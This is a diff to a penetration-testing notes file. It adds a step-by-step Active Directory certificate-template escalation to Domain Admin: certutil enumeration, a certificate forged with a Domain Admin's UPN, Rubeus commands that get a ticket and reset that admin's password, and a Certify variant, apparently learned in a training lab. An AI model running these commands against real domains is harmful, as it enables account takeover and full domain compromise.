@@ -2107,7 +2107,40 @@ Abuse with Rubeus
   - Enumerate the templates: `Certify.exe find`
   - Enumerate vulnerable templates: `Certify.exe find /vulnerable`
 
-Escalation to DA
+**Escalation to DA**
+1. Template enumeration
+   - Enumarate all the templates
+     - `certutil -v -template > cert_templates.txt`
+     - Look for a template where our user has either the Allow Enroll or Allow Full Control permission
+   - Find your own groups
+     - `net user <username> /domain`
+     - Two groups are common for certificates: Domain Users, Domain Computers
+   - Ensure that the certificate has the Client Authentication EKU
+     - Check the template's EKU attributes to make sure the "Client Authentication" is included
+   - Check to see whether you can specify the Subject Alternative Name (SAN) in the template
+     - Grep `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`, it should be set to 1
+   - Note the templates that tick all these boxes
+2. Generate a malicious certificate
+   - Open Microsoft Management Console
+   - Click `File -> Add/Remove Snap-in...`
+   - Add the `Certificates` snap-in
+   - Expand the `Certificates` option, right-click on `Personal`, select `All Tasks`, and click on `Request New Certificate`
+   - Select `Next` twice
+   - Click `More information is required to enroll this certificate. Click here to configure settings.`
+   - Impersonate one of the DA users in this domain, possibly a service account
+     - Change the `Subject name` Type to `Common Name` and provide a name
+	 - Change the `Alternative name` Type to `User principal name` and provide the UPN of the account we want to impersonate
+     - Add these properties for the certificate and click `OK`
+   - Select `User Request` and click on `Enroll`
+   - Right-click on the certificate, select `All Tasks`, click on `Export`
+     - Make sure to export the private key as well, click next for everything else
+3. Use the certificate to request a Kerberos ticket granting ticket (TGT) and load it
+   - `Rubeus.exe asktgt /user:<username> /enctype:aes256 /certificate:<certificate_path> /password:<certificate_password> /outfile:<tgt_user_kirbi> /domain:<domain> /dc:<DC_IP>`
+   - Open the Active Directory Users and Computers application and choose a DA
+   - `Rubeus.exe changepw /ticket:<tgt_user_kirbi> /new:<new_password> /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\<DA_username>`
+   - `runas /user:lunar.eruca.com\<DA_username> cmd.exe`
+
+**Using Certify**
 - Request a certificate for Certificate Request Agent from TemplateTarget-Agent template.
   - `Certify.exe request /ca:<CA_Server>\<CA_Name> /template:TemplateTarget-Agent`
 - Convert the cert.pem file to pfx format, named esc3agent.pfx, and utilize it to request a certificate on behalf of the Domain Administrator (DA) using the "TemplateTarget-Users" template.
